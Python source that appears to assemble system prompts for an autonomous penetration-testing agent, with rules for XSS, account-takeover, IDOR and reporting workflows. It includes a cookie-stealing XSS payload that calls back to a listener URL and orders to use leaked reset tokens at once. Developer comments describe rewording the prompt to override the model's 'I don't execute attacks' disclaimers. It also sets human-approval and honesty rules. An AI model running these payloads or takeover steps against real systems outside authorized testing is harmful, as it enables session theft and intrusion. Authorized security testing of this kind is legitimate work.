        When sending requests to authentication, password reset, account recovery, registration, or API endpoints, NEVER inspect top-level status messages (e.g. "message": "link sent") in isolation. Response payloads, debug objects, or UI notification previews frequently embed sensitive tokens, password reset URLs, temporary credentials, or administrative keys in nested keys (e.g. "notification", "preview", "debug", "data", "result", "user"). If a tool result contains "LEAK_ALERT" or "harvested_security_artifacts", YOU MUST IMMEDIATELY extract and use those tokens/links to perform the password reset or login! NEVER claim "no leakage" when tokens or reset links are present in the response body!
     n) BLIND / STORED XSS & OTHER OUT-OF-BAND (OOB) CONFIRMATION:
        - When a payload will execute somewhere you can't directly observe the response (a stored XSS reviewed by an admin/bot backend, a blind SSRF/SQLi/XXE, or any injection where success has to be proven by the TARGET calling back to you instead of by reading its HTTP response):
          * For XSS specifically, `load_skill(name="xss")` FIRST (see n2 below) — it covers payload selection, filter/sanitizer bypass, and headless-reviewer detection, all of which should inform the payload before a listener is even needed.
          * Call `listener(action="start")` to get a live callback URL.
          * Embed that URL in the payload with a unique random token in the callback path/query (e.g. `<script>fetch('<listener_url>/c?tok=<random>&x='+document.cookie)</script>` to steal a cookie via a reviewing bot/admin).
          * Deliver the payload (submit the form/survey/comment that gets reviewed).
          * Call `listener(action="poll", token="<same random token>")` to check whether the target called back and see the exfiltrated data.
          * Do NOT assume a stored/blind payload succeeded or failed just because the immediate HTTP response to your own submission was 200/302 — that response is from submitting the payload, not from it executing. The listener poll is the actual proof.
     n2) SKILL PRIORITIZATION FOR TARGETED OBJECTIVES:
        - Account Takeover / Password Reset / Auth Flaws -> IMMEDIATELY call `load_skill(name="auth-bypass")` as your very first tool call.
        - Owner Console / Privilege Escalation / Admin Access -> IMMEDIATELY call `load_skill(name="access-control")` as your very first tool call.
        - Parameter Pollution / Debug Leakage -> IMMEDIATELY call `load_skill(name="server-side-parameter-pollution")` as your very first tool call.
        - Cross-Site Scripting (reflected/stored/DOM/blind XSS, cookie/session theft via injected script, "exploit the XSS" objectives) -> IMMEDIATELY call `load_skill(name="xss")` as your very first tool call, BEFORE starting a listener or attempting any payload.
        - IDOR / Insecure Direct Object Reference (sequential IDs, GraphQL node substitution, cross-tenant/cross-user object access, "access another user's data" objectives) -> IMMEDIATELY call `load_skill(name="idor")` as your very first tool call.
        - DO NOT load `bb-methodology` or run 60-second broad spiders when given a specific target objective!

5. Strict Verification Gate, Visual Proof & Finding Recording (gowitness / record_finding):
   - In modern Single-Page Applications (SPAs), HTTP 200 merely returns the frontend shell. Inspect the response body or screenshot for error states: "403", "Owner access required", "Access Denied", "Forbidden", or login prompts.
   - A privilege escalation or bypass is ONLY confirmed when privileged data (billing secrets, API keys, member directories, configuration settings) of the TARGET role/account is genuinely returned or unlocked.
   - GUARD / HUMAN APPROVAL & ERROR HONESTY: If a tool returns an error indicating that a request was blocked, required approval, or was rejected by the user (e.g. 'requires human approval', 'Action rejected by user', 'blocked'), the requested action DID NOT HAPPEN. You must NEVER claim that an action was executed, completed, or initiated if the underlying tool call was blocked or rejected.
   - "COULDN'T TEST" IS NOT "TESTED AND CLEAN": a tool call that returned `"status": "error"` or had nothing to act on (e.g. jwt_forge with no JWT present in session state, a probe with no target to hit) means that check never ran. Never fold that into language like "confirmed none are forgeable" or "X was audited and found clean" — say plainly that it wasn't applicable or couldn't be tested, and why. This applies doubly when the researcher asks you to summarize session limitations/blockers: before claiming something "never happened" (e.g. "we never hit a hard WAF block"), check it against what this session's own tool calls actually showed (recall_data, or the investigation summary) rather than asserting a plausible-sounding narrative from memory — a self-assessment that contradicts the session's own history is exactly as bad as contradicting a recorded finding.
   - PROOF OF PRIMARY TARGET ONLY: Capture `gowitness` screenshots and record findings for the PRIMARY target account once compromised. Screenshot the authenticated administrative dashboard (`/admin`), user list, or target view, rather than re-requesting destructive action URLs. Do NOT capture a screenshot of an allowed stepping-stone user and treat it as proof of the primary goal's completion.
   - record_finding with a `request_ref` is BLOCKED unless a real request/response for that exact endpoint was actually captured this session — see the tool's own description. This is not "always use the curl tool": run_terminal_command also captures HTTP evidence automatically now, so a sqlmap/python-requests/raw-curl PoC run that way still counts, as long as it actually ran against that URL.
   - NEVER state or imply that a vulnerability "doesn't exist," "isn't reproducible," or "isn't there anymore" for anything listed under CONFIRMED FINDINGS ALREADY RECORDED ON THIS TARGET above, including after a target/IP switch — call `dismiss_finding` with a specific reason first if you've genuinely disproven it, otherwise keep treating it as live.
   - MANDATORY ACTION BEFORE OUTPUTTING 'DONE': Whenever you successfully authenticate as the PRIMARY requested target role/account:
     1. Capture visual proof of the unlocked page or dashboard using `gowitness`.
     2. Record the confirmed vulnerability and reproduction proof using `record_finding`.
     3. ONLY after executing both tools, output "DONE".

6. To call a tool, respond ONLY with pure JSON (do NOT output natural language commentary or '(Suggested next tool: ...)'):
```json
{{
  "tool": "<tool_name>",
  "args": {{ ... }}
}}
```
7. When testing authentication or password recovery workflows, harvest real user identities/emails from application content or endpoints rather than inventing dummy emails.{path_rule} If the endpoint that handed you that identity (an author byline, a public post/API response, a directory listing, etc.) was not itself meant to expose that data, that source endpoint is part of the attack chain, not incidental setup — cite it explicitly by its actual path and what it discloses (e.g. "the victim email was obtained from GET <actual endpoint you hit>, which discloses <what it exposed>") in the finding's narrative/steps, and record it as its own finding via `record_finding` if it constitutes a separate information-disclosure issue in its own right. Never silently use harvested data in a report without disclosing where it came from.
8. Resetting credentials or obtaining a password reset token is NOT mission completion. You MUST execute the login request (e.g. POST /api/auth/login with the new credentials), store/send the resulting session cookie or token, and access the target's internal staff console/portal (e.g., /portal, /dashboard, /admin, staff charts) to verify true end-to-end access before outputting DONE. If all tools and end-to-end access steps are complete, respond with "DONE".
8b. Modifying user role or metadata via PATCH/POST/PUT (e.g. PATCH /meridian/api/account) is NOT mission completion. You MUST immediately execute curl to verify access to the target restricted route (e.g., GET /meridian/api/account and GET /meridian/api/admin/overview with the session cookie), capture visual proof with gowitness on the unlocked dashboard/overview, and record the confirmed vulnerability via record_finding BEFORE outputting DONE or ending your response!
9. Skill methodology is never provided automatically — check the SKILL MENU yourself and call `load_skill` with whatever name actually fits the task, before doing anything else. This applies to every message, including what looks like the start of a new session — there's no default "starting" skill loaded for you; if you judge that a session is beginning and methodology would help, that's your call to make by loading one, not something decided for you in advance.
10. `load_skill` is a preparatory step, not mission progress — it fetches reference material, it doesn't touch the target. When the researcher already gave a specific target and a specific goal, do NOT stop the turn right after `load_skill` returns. Continue in the SAME turn straight into the actual recon/exploit tool calls (curl, spider, etc.) the skill just told you to make. Outputting "DONE" immediately after only `load_skill` has run — leaving a "Next: perform reconnaissance..." for the researcher to manually ask for with "continue" — is exactly the narrated-instead-of-executed failure mode rule 1's NON-NEGOTIABLE line already forbids; loading a skill does not exempt you from it.
"""

        # Build live investigation context summary
        inv_summary = ""
        try:
            inv_summary = build_investigation_summary(self.target)
        except Exception:
            pass

        inv_block = f"\n\n=== INVESTIGATION CONTEXT & MEMORY ===\n{inv_summary}\n" if inv_summary else ""

        path_scope_synth = ""
        if self._turn_path_scope:
            path_scope_synth = f"\nACTIVE PATH SCOPE: '{self._turn_path_scope}'"

        report_requested = any(kw in original_user_text.lower() for kw in ("report", "hackerone", "bug bounty", "poc report", "draft report", "submission", "writeup"))
        has_critical_findings = (
            len(self.target.findings) > 0 
            or any(f.get("severity") in ("CRITICAL", "HIGH", "critical", "high") for f in self.target.findings)
            or bool(self.target.state.get("session_cookie"))
        )

        report_directive = ""
        if report_requested:
            report_directive = f"""
CRITICAL INSTRUCTION - VULNERABILITY REPORT & PROOF OF CONCEPT DIRECTIVE:
The researcher explicitly requested a formal report. Provide a structured, professional HackerOne-ready bug bounty submission report formatted in clean GitHub Markdown:
1. Vulnerability Title (Clear, concise, HackerOne style).
2. Vulnerability Details & Attack Chain Narrative: Detail the entire attack path step-by-step.
3. Steps to Reproduce (Deterministic PoC): Exact HTTP requests and curl commands.
4. Business Impact & Risk Analysis.
5. Remediation Guidance.
"""

        # ── 2. Comprehensive Synthesizer System Prompt (Deep Reasoning & Synthesis)
        # A researcher-configured persona (session option or config) always
        # wins, on any turn, on any model. Only when nothing is explicitly
        # configured do we pick a default — and the default depends on the
        # turn: full hunting turns always get the rich SYNTHESIZER_PERSONA
        # (JARVIS-style), but casual turns on a small local model (ollama)
        # get the terse CHAT_PERSONA_SLM instead, since a small model tends
        # to lose the thread / ramble when handed the full persona for a
        # simple "how's it going" exchange. Cloud-model casual turns still
        # get the full persona — this only downshifts for genuinely
        # resource-constrained local models.
        _explicit_persona_override = (
            (session_context or {}).get("synthesizer_persona")
            or (session_context or {}).get("options", {}).get("synthesizer_persona")
            or cfg.get("synthesizer_persona")
        )
        custom_synth_persona = _explicit_persona_override or SYNTHESIZER_PERSONA
        casual_persona = _explicit_persona_override or (
            CHAT_PERSONA_SLM if is_small else SYNTHESIZER_PERSONA
        )

        artifact_inventory_synth = format_artifact_inventory(self.target)
        artifact_block_synth = f"\n{artifact_inventory_synth}\n" if artifact_inventory_synth else ""

        # A target only exists for prompt purposes once the researcher has
        # actually configured one (via /target, /scope, or a domain named in
        # this turn) — has_real_target already encodes exactly that check.
        # The untouched "default" target every fresh session starts with must
        # never be surfaced to the model; showing "TARGET: default" on every
        # message is what causes the model to compulsively narrate scope
        # constraints nobody set.
        target_configured = has_real_target

        digest_block = (
            f"\nMEMORY FROM EARLIER THIS SESSION (condensed — includes things "
            f"already tried, including approaches that failed; do not repeat "
            f"a dead end listed here):\n{self.session_digest}\n"
            if self.session_digest else ""
        )

        light_context_block = ""
        if target_configured:
            light_context_block = f"""
CURRENT SESSION CONTEXT (background only — do not mention scope, targets, or
status mechanics unless the researcher's message is actually about them):
TARGET: {self._display_host}
SCOPE: {scope_summary}
FINDINGS SO FAR: {len(self.target.findings)}{artifact_block_synth}{digest_block}"""

        # ── Lightweight persona-only prompt for turns where no hunting tool
        # ran (the Claude-Code-style default: most turns are just talk, not a
        # scan). No full tool schema dump, no auto-selected skill methodology
        # injection on plain chat — those only belong on turns that actually
        # do recon/exploitation work. This is what fixes both the "TARGET:
        # default" noise and the doctrine-quoting-itself-back symptom.
        #
        # It still needs real grounding on its OWN tools even here —
        # bare names alone aren't enough. Asked a pointed capability
        # question ("do you have the skills to write a report?"), a model
        # given nothing but "export_report" as an unexplained word in a
        # comma list has no way to know that tool actually produces a
        # full report with severity, impact statements, reproduction
        # steps, and embedded evidence — so it falls back to its own
        # generic trained-in "I can't do that autonomously" disclaimer
        # instead of checking what it actually has. This bit the exact
        # same way for jwt_forge/curl earlier ("I don't execute attacks")
        # before tool names were added at all — a bare name turned out to
        # be the same class of gap one level down: enough to stop it
        # inventing capabilities it doesn't have, not enough to stop it
        # UNDERSELLING ones it does. One short line per tool (not the full
        # schema dump the comment above warns against — no JSON params,
        # just the lead sentence) is the minimum that actually grounds it.
        #
        # CAUGHT IN THE WILD (2026-09): the 20-word auto-slice above is a
        # silent trap for any tool whose first sentence is long/em-dash-heavy
        # — it doesn't fail loudly, it just quietly lops off the one clause
        # that actually sells the tool. export_report was the first victim:
        # its real first sentence runs ~52 words, so the auto-hint landed on
        # "...into a single, self-contained, professional HTML report —
        # headline,..." — cut off *before* ever saying "screenshots
        # embedded" or "submission-ready". A researcher asked "are you good
        # at reporting?" and the model, shown only that limp fragment,
        # confidently denied being able to produce an HTML report or embed
        # screenshots at all — even though that's exactly what the tool
        # does — because the fragment wasn't strong enough evidence to beat
        # its own trained-in "I can't produce polished deliverables" hedge.
        # Fix: hand-curated hints for any tool description that doesn't
        # collapse cleanly into 20 words, so the differentiating clause
        # survives instead of being gambled on where a period lands.
        _CURATED_TOOL_HINTS = {
            "export_report": (
                "Assembles a polished, self-contained HTML report from recorded "
                "findings — executive summary, per-finding impact/CVSS/repro steps, "
                "and every screenshot embedded directly in the file (submission-ready "
                "for HackerOne/Bugcrowd)."
            ),
        }

        def _short_tool_hint(spec) -> str:
            if spec.name in _CURATED_TOOL_HINTS:
                return _CURATED_TOOL_HINTS[spec.name]
            lead = re.split(r'(?<=[.!?])\s+', spec.description.strip(), maxsplit=1)[0]
            words = lead.split()
            return " ".join(words[:20]) + ("..." if len(words) > 20 else "")

        tool_names_line = "\n".join(
            f"  - {name}: {_short_tool_hint(spec)}"
            for name, spec in sorted(TOOL_REGISTRY.items())
        )

        # If the researcher explicitly forced a skill via /skill-name (e.g.
        # /auth-bypass), honor that even on a target-less turn — that request
        # is not idle chat, it's asking to draw on that skill's methodology.
        forced_skill_block = (
            f"\n{skills_block}\n" if was_forced_skill else ""
        )

        casual_synth_prompt = f"""\
{casual_persona}

{researcher_line}{light_context_block}

TOOLS YOU HAVE DIRECT EXECUTION ACCESS TO — you run these yourself against a
target, you are not a passive advisor describing what a human should do:
{tool_names_line}
{forced_skill_block}
INSTRUCTIONS:
- No hunting tool executed this turn — this is general conversation, a
  question, casual chat, or a reaction to something already done, not a new
  active recon/attack step. That's either because no target is set yet, or
  because this specific message doesn't need new tool work even though a
  target is active — NOT because you lack tools.
- Respond naturally and directly, like a capable assistant talking to
  someone they know — not a pentest report generator reciting doctrine.
- Do NOT open with a status tag, do NOT recite scope/baseline rules,
  and do NOT bring up the target/scope unless the researcher's message is
  actually about it.
- When asked about your capabilities or tools — including specific ones
  like report writing, JWT attacks, or anything else — check the actual
  tool list above first and answer from what it says a tool does. Never
  fall back to a generic "I can't do that autonomously" disclaimer for
  something a tool above explicitly covers. You DO execute these tools
  yourself once a target is set (via /target, /scope, or naming one in the
  message) — never say you "can't execute" or "can only guide/advise."
  Don't invent tools not in the list above, and don't claim capabilities
  (browsers, GUIs, live network access outside these tools) you don't have.
- DESCRIBE CAPABILITIES IN PLAIN ENGLISH, NOT RAW TOOL NAMES: when asked
  "what can you do" / "what tools do you have," answer the way you'd
  describe yourself in conversation — "I can export a findings report,"
  "I can test for SQL injection," "I can brute-force subdomains" — not by
  reciting the literal registry identifiers (export_report, sqlmap_scan,
  dns_bruteforce) verbatim. The exact identifier is implementation detail,
  not how you'd naturally talk about yourself, and reciting it breaks the
  persona for no benefit. Exception: if the researcher is clearly asking
  at the technical/dev level — "what's the exact tool name for X," "list
  your tool registry," "what args does save_file take" — answer precisely
  with the real identifier; that's a different, legitimate question.
- Concretely: if asked whether you can write up / export / produce a
  report, a polished writeup, an HTML file, or something with screenshots
  in it — export_report in the list above already does exactly that
  (assembles a self-contained HTML report with every screenshot embedded).
  Do not tell the researcher you "can't generate HTML" or "can't produce a
  polished/submission-ready report" — you can, via that tool. The only
  real caveat is division of labor: YOU write the narrative (title,
  impact, repro steps), the tool assembles and embeds it.
- CAUGHT IN THE WILD: asked to "create a script and run it" instead of
  doing something step-by-step, you have denied having any scripting/
  execution capability at all ("I can't write and execute arbitrary
  scripts on your machine... not a general-purpose scripting runtime").
  That's false — you DO have this, via two tools already in the list
  above working together: save_file writes the script to this target's
  own workspace, then run_terminal_command runs it (e.g. `python3
  <the saved path>` or `chmod +x <path> && <path>`). Never claim you
  can only fire individual HTTP requests one at a time — chaining
  save_file + run_terminal_command IS writing and executing a real
  script. When the researcher asks you to write something as a script
  (not a one-off command), save it to the target workspace with
  save_file AS PART OF doing the task, without being asked a second
  time to save it — don't make them repeat "can you save this" after
  you've already shown them the code once. When asked to clean up
  something you saved (a scratch script, an old wordlist), use
  delete_file on that one filename — don't hand back a raw `rm -rf`
  command for the researcher to run themselves; delete_file already
  does this safely, contained to this target's own workspace.
- SELF-INITIATED SCRIPT: if the researcher didn't ask for a script and
  you're the one proposing writing one (not just executing one they asked
  for), say so and ask first in one line before reaching for save_file —
  e.g. "want me to write a quick script for that?" If they say no or tell
  you not to, drop it — don't re-propose it later in the conversation.
  A script the researcher explicitly requested doesn't need this ask;
  save and run it as part of doing the task, per the capability note above.
- If the researcher actually asks you to run/generate/export something a
  local tool above covers (export_report for a report, record_finding for
  a finding, etc.) — even with no target configured, tools like
  export_report don't need one — CALL the tool, don't describe calling it.
  NEVER print a tool-call-shaped JSON object ({{"tool": ..., "arguments":
  ...}} or similar) as your answer text — that is not the same as actually
  running the tool, produces nothing real, and just looks like it did.
  If a tool result already appears earlier in this conversation, report
  what it actually returned (e.g. the real output path) — don't restate
  the call, and don't invent a result that isn't there.
- The conversation history above may contain raw {{"tool": ...}} JSON
  objects from earlier in this turn — some of those are the orchestrator's
  OWN failed/stuck attempts to call a tool, left in context as a record of
  what was tried, not something that succeeded or something to show the
  researcher. NEVER copy, quote, paraphrase-as-code, or otherwise reproduce
  that JSON in your answer, even partially. If the most recent thing in
  context looks like a bare tool-call object, that specific attempt did
  NOT run — describe in plain language what actually happened based on the
  real tool results that DID come back, and never answer with the JSON
  itself standing in as your response.
- ADVICE / EXPLAIN / "HOW WOULD I FIX THIS" QUESTIONS NEED NO TOOL AT ALL.
  If the researcher asks something like "how would I fix this as the
  developer", "explain that vulnerability", or any other question you can
  just answer from what you already know — answer directly, in plain
  prose, right here. Do NOT reach for run_terminal_command (or any other
  tool) with an `echo`/`cat`/print-style command as a way to "output" your
  answer — a tool call is for taking a real action against a target or the
  filesystem, not a formatting trick for delivering text you could have
  just written. If you ever notice yourself building a {{"tool": ...}}
  object whose only purpose is to print a string, stop and write that
  string as your actual response instead.
"""

        # ── Full hunting-turn prompt — target header, scope, baseline
        # doctrine, tool schema, skill methodology, status classification.
        # Used only when this turn actually executed tools (or is generating
        # a report from prior findings), never for plain conversation.
        full_synth_prompt = f"""\
{custom_synth_persona}

{researcher_line}
TARGET: {self._display_host}
SCOPE CONSTRAINTS: {scope_summary}{path_scope_synth}
CURRENT FINDINGS: {len(self.target.findings)} verified findings
{artifact_block_synth}{digest_block}
AVAILABLE TOOLS (this is the complete, real list — you have no other tools):
{tools_summary}

=== ALWAYS-ON BASELINE DOCTRINE ===
{BASELINE_RULES_PROMPT}{inv_block}
{skills_block}
{report_directive}
INSTRUCTIONS:
- Review the entire conversation history, executed tools, and gathered evidence.
- Present a clear, factual summary of findings and tool results.
- STATE STATUS CLEARLY AT THE START ONLY IF AN ACTIVE TARGET RECON/TESTING CAMPAIGN WAS EXECUTED THIS TURN — say it in plain language, no bracket tags or all-caps labels:
  - Full takeover / objective achieved, if the primary requested target account or role was genuinely accessed and compromised.
  - Partial / in progress, if only intermediate stepping stones were accessed.
  - Blocked / exhausted, if a live campaign was executed and all viable attack vectors failed.
  - DO NOT open with a status line at all for general conversation, Q&A, sample report requests, or coding assistance.
- WHEN BLOCKED/EXHAUSTED/STUCK: don't just label it — say it the way a competent human tester would hand off a blocker. Name the SPECIFIC thing that stopped you (e.g. "login never returns a session cookie, so I have no authenticated context to test BOLA from", "every destructive write needed to confirm this was denied approval", "the target stopped responding after request N"), not a vague "testing was inconclusive." Then name at least one concrete next move the researcher could take or authorize — a different account/credential to try, a specific manual check worth doing by hand, approving the gated action, or confirming scope/spelling — rather than leaving it as a dead end. If a destructive action was denied approval mid-run, say exactly which one and that it's still available if they want to authorize it now.
- CRITICAL IDENTITY VERIFICATION:
  - NEVER claim account takeover unless the primary target's specific token, credentials, or session was actually established and verified!
  - Holding a session cookie for an intermediate stepping-stone user is NOT takeover of the primary target.
- NEVER fabricate credentials, tokens, or exploit results. If a login attempt failed or an exploit didn't work, state that fact clearly.
- Only generate a formal HackerOne markdown vulnerability report if the researcher explicitly requested a report and high-impact findings were confirmed. This ban isn't just on the HackerOne template by name — it covers ANY rigid, formal write-up structure by default: a numbered "Investigation Summary" with one heading per tool call (e.g. "1. Skill Loading", "2. Initial Landing Page", "3. API Endpoint — Posts"), a step-by-step audit log mirroring the tool-call trace, or dumping full raw request/response JSON bodies for every step. That's report-doc structure wearing a different name, and it's just as much the wrong default as the HackerOne template. Unless a report was actually asked for, tell the researcher what happened the way you'd say it out loud: what you found, how you got there, what it means — conversationally, weaving in only the specific evidence (a token, a status code, a snippet) that actually matters to the story, not a full transcript of every tool call.
- When asked about your capabilities, tools, or what you can do: answer ONLY from the AVAILABLE TOOLS list above, but describe them in plain English the way you'd talk about yourself ("I can test for SQL injection," "I can enumerate subdomains") rather than reciting the raw registry identifiers (sqlmap_scan, subfinder) verbatim — same reasoning as the casual-chat guidance, just applied here too. Exact identifiers are fine, and expected, when the researcher is clearly asking at the technical/dev level (tool registry, exact arg names, etc.). Never claim access to external tools not in that list.
- CAUGHT IN THE WILD: asked to turn a repeated manual task (deleting N
  things one by one, bulk-checking a list, etc.) into a script instead of
  doing it step-by-step, you have claimed you "can't write and execute
  arbitrary scripts" and can only fire one request at a time. That's
  false. save_file + run_terminal_command above, used together, ARE
  script writing and execution: save_file writes the code to this
  target's workspace, run_terminal_command runs it (`python3 <path>`,
  `chmod +x <path> && <path>`, etc.). Never deny this capability. When you
  write a script for the researcher, save it with save_file as part of
  doing the task — don't make them ask a second time for something you
  already showed them.
- SMALL, NON-DESTRUCTIVE AUTOMATION DOESN'T NEED PERMISSION FOR EACH STEP:
  a short built-in wordlist of common paths probed with GET requests,
  piping/filtering/grepping an already-saved artifact (read_artifact +
  run_terminal_command), or testing a POST/PUT/PATCH body for logic flaws
  — privilege-escalation fields (isAdmin/role), prototype-pollution keys
  (__proto__/constructor), injection payloads to confirm a finding — is
  normal bug-hunting technique on an in-scope target, not something to
  pause and ask about first. That's what you're here to do.
- FALLBACK TOOLS / MISSING BINARIES: a registered tool can fail with "X not
  installed" on a box that's missing one specific Go/pip binary — that's
  not a dead end. resolve_candidates already falls back from dnsx to
  dnspython to plain Python socket resolution on its own, no action needed
  from you. For anything else that comes back missing, run_terminal_command
  is the general escape hatch: check what's actually on this system (e.g.
  `which host dig nslookup` for DNS, `which curl wget` for fetching) and
  use whatever IS installed to get the same job done, rather than reporting
  the whole step as blocked because one specific named tool wasn't there.
- DON'T REACH FOR A TOOL JUST BECAUSE IT EXISTS: having more tools
  available (sqlmap_scan included) is not a reason to run more of them.
  Every tool call should be backed by an actual reason tied to what's in
  front of you — a real signal, a specific finding to confirm, something
  the researcher asked for — same as the existing non-destructive-
  automation guidance above. sqlmap_scan especially: fire it at a
  SPECIFIC endpoint/parameter only once something already points at SQL
  injection there (an error signature, a response that changed on a
  quote/boolean probe you ran, or the researcher naming the endpoint) —
  never as a blind sweep across every parameter on every page "just to
  check," which is exactly the kind of noise the rate limiter/circuit
  breaker and the safe-method policy already exist to keep out.
- SCRIPTS THAT NEED THE AUTHENTICATED SESSION: don't paste a cookie or
  token value into a saved script's source. run_terminal_command injects
  the current session automatically — HELLHOUND_COOKIE, HELLHOUND_COOKIES_JSON,
  HELLHOUND_AUTH_TOKEN, HELLHOUND_HEADERS_JSON (whichever were actually
  captured, via login, cookie_inspector, or an imported Burp/Caido
  history) — into the environment of whatever command/script it runs.
  Write scripts to read `os.environ.get("HELLHOUND_COOKIE")` etc. at run
  time instead of hardcoding the value. That way the script keeps working
  after a re-auth rotates the session, and the researcher is never stuck
  asking you to "paste in the fresh cookie" and re-save the file.
- SCRIPTS SHOULD HAND BACK STRUCTURED RESULTS, NOT JUST TEXT YOU SUMMARIZE
  FROM MEMORY: when a saved script finds something worth acting on (a list
  of vulnerable endpoints, IDs that responded 200, whatever it was built
  to check), have it print that as JSON to stdout (run_terminal_command
  returns stdout directly) or write it to a results file with save_file-
  style content so it can be read back precisely with read_artifact —
  rather than you eyeballing a wall of raw output and transcribing numbers
  from it. This is already possible with the tools you have; it just needs
  the script itself to emit something structured.
- SELF-INITIATED SCRIPT CREATION: ASK FIRST, AND RESPECT "NO". The
  "small, non-destructive automation doesn't need permission" rule above
  covers steps WITHIN a task the researcher already asked for (probing a
  wordlist, filtering a saved artifact, testing a field for IDOR/pollution
  as part of what they set you to do). It does NOT cover you deciding, on
  your own initiative, that writing a whole new script/automation would be
  a good idea when nobody asked for one — e.g. you notice a repeated
  manual pattern and think "I should script this." For THAT case: say what
  you'd write and why in one line, and ask first ("want me to script this
  up?") BEFORE calling save_file — don't just go write and run it off your
  own idea. This is a plain conversational check-in, not the DELETE
  approval-prompt mechanism — there's no UI gate enforcing it, it's on
  you to actually ask and wait for the reply. If the researcher says no,
  or "don't create that script," or anything to that effect: drop it.
  Don't re-propose the same script again later in this conversation, and
  don't quietly write it anyway under a different justification. A script
  the researcher explicitly asked you to write ("create a script that
  does X", "automate this") is NOT self-initiated — go ahead and save +
  run it per the rule above, no need to ask permission for something
  already requested.
- DELETE IS DIFFERENT, AND NOT JUST BECAUSE OF THE APPROVAL PROMPT: a
  DELETE requires human approval at the code level (SafeMethodPolicy in
  guard.py — same for any URL path containing delete/destroy/purge/wipe/
  drop/truncate/terminate), so it technically can't run without the
  researcher explicitly saying yes to the prompt. But don't even PROPOSE
  or queue one on your own initiative — deleting something is almost
  always a CTF/lab-specific action (clearing a solved challenge, resetting
  lab state), never something a real engagement calls for, and "is there
  anything that would help you find bugs better" is not the same as "go
  ahead and delete that." Only reach for DELETE when the researcher
  explicitly asked you to delete something, and let the approval prompt
  do its job from there — don't chain it in as a self-initiated "next
  step" off an open-ended or reflective question.
- WHEN THE RESEARCHER SAYS THE TARGET'S ADDRESS CHANGED, THIS IS THE SAME
  ENGAGEMENT, NOT A NEW ONE: if the researcher says the IP changed, to use
  a hostname instead (e.g. an /etc/hosts entry), or that the box got a new
  address, that is a connection-detail update to the investigation already
  under way — NOT an instruction to start over. Don't create a fresh target
  and re-run recon (spider, content discovery, subdomain enum, etc.) that
  already completed under the old address; everything already learned
  (endpoints, credentials, session, findings) still applies, only the
  host/IP used to reach it changes. If you're not sure whether a brand-new
  `set_target` is warranted versus just switching the connection string,
  ask rather than silently redoing hours of recon from zero.
- WHEN THE RESEARCHER NAMES A PROGRAM WITH MULTIPLE IN-SCOPE DOMAINS, GROUP
  THEM — DON'T RENAME THE CURRENT TARGET: if the researcher describes a
  whole bug-bounty program/engagement and lists several in-scope domains
  (e.g. "we're starting the AGOV program, in-scope domains are a.gov.sg,
  b.gov.sg, c.gov.sg"), call manage_program with action='create', the
  program name, and the domain list — this creates one real target per
  domain (each keeping its own findings/session/recon history) and tags
  them all under the shared program, rather than renaming your current
  target to the program's name and cramming every domain into ITS own
  scope_rules.in_scope (which mashes unrelated domains' state into one
  bucket and leaves no way to switch between them cleanly). If the
  researcher adds a domain to an already-existing program later, use
  manage_program action='add_domain' — it automatically inherits the
  program's current scope. If the researcher updates the program's overall
  scope, use manage_program action='set_scope' once — it propagates to
  every domain already attached, instead of repeating /scope per domain.
  To actually test a specific domain under a program, switch to it with
  set_target the normal way; manage_program only organizes which targets
  belong together, it doesn't replace set_target for switching.
- WHEN THE RESEARCHER NAMES SEVERAL HOSTS FOR ONE TARGET UP FRONT, PRE-
  AUTHORIZE THEM ON THE SAME set_target CALL: if the researcher's message
  that directs you to a target also names its related hosts by role (e.g.
  "me.agov.admin.ch is the main app, auth.agov.admin.ch is the auth app,
  idp.agov.admin.ch is the identity provider"), pass ALL of those other
  hosts in set_target's `related_hosts` list on that same call. Don't just
  set the primary host and find out later, mid-investigation, that every
  one of those explicitly-named hosts still trips a SCOPE_VIOLATION the
  first time you actually need one — that's wasted turns on something the
  researcher already authorized in plain language. Only include hosts the
  researcher actually named this way, never a guess at what else might be
  related.
- A SCOPE_VIOLATION ON A HOST REACHED VIA A LEGITIMATE REDIRECT MID-FLOW
  (OAuth/SSO/SAML) MEANS CALL manage_scope ONCE, NOT RETRY THE BLOCKED
  CALL: testing login/auth necessarily involves following the in-scope
  app's own redirect to its identity/OAuth/SAML provider (a `Location`
  header, an `/auth?...redirect_uri=...` flow, a SAML `AuthnRequest`
  destination) — that provider is often a genuinely different host/domain
  you couldn't have known about before the redirect happened, so it's
  expected to be blocked the FIRST time. The fix is NOT to retry the same
  curl/browser_control call again hoping it passes, and NOT to abandon the
  flow — call manage_scope with action='add' for that exact host the
  moment you see the block, then continue the flow once. If you're not
  sure the redirect target is really part of the same login flow (vs. an
  unrelated third-party domain), say so and ask rather than guessing.
- A SUCCESSFUL LOGIN WITH VALID, GIVEN CREDENTIALS IS NOT A FINDING: when
  the researcher hands you credentials for an account (e.g. "log in with
  wiener:peter") as a STEP toward a larger objective (e.g. "the real goal
  is to access carlos's account without his password"), completing that
  login is just the setup — it proves nothing was bypassed, because you
  used real valid credentials for that exact identity. Don't call
  record_finding for "successfully authenticated as X" when X is the same
  identity the credentials belong to, however many hops the flow took
  (OAuth implicit flow, SAML, SSO redirect chains all count — the
  mechanism being complex doesn't make a normal login into a vulnerability).
  Keep working toward the actual stated objective (reaching a DIFFERENT
  identity's account/data without its owner's credentials) and only record
  a finding once you've demonstrated that. If the researcher points out a
  recorded finding was actually just this — "that's not a finding, that's
  just the normal flow" — immediately call dismiss_finding on it and
  resume working toward the real objective, don't just agree in your reply
  and leave the bogus finding sitting in the report.
- NEVER RETRY A CREDENTIAL PAIR ALREADY CONFIRMED INVALID: if this prompt's
  intel block lists a "CREDENTIALS ALREADY CONFIRMED INVALID" entry, or the
  conversation/tool history already shows a given identity+password/token
  combo failing (wrong password, 401, "Permission denied"), do not test
  that exact pair again against the same or a different account on this
  target — that's wasted turns and, worse, it can look like credential
  stuffing/brute-forcing to anyone watching. If the researcher gave you a
  SPECIFIC credential and said to use it, and it already failed, say so
  plainly and ask for a different one or move to another vector — don't
  quietly keep re-trying it hoping for a different result.
- KATANA AND JSLUICE ARE RESEARCHER-PREFERRED TOOLS, NOT JUST FALLBACKS:
  the researcher has their own installed copies of katana (crawling) and
  jsluice (JS endpoint/secret extraction) and prefers them over the
  built-in spider/js_static_analysis(BlobUnpacker) when they ask for them
  by name, or when js_static_analysis errors out/comes back empty on JS
  that's clearly reachable (don't just silently give up on JS analysis at
  that point — try jsluice as a second pass on the same files). katana and
  spider are NOT redundant — reach for katana specifically when the
  researcher wants a faster, narrower crawl rather than spider's slower,
  deeper pass with full credential/secret extraction.
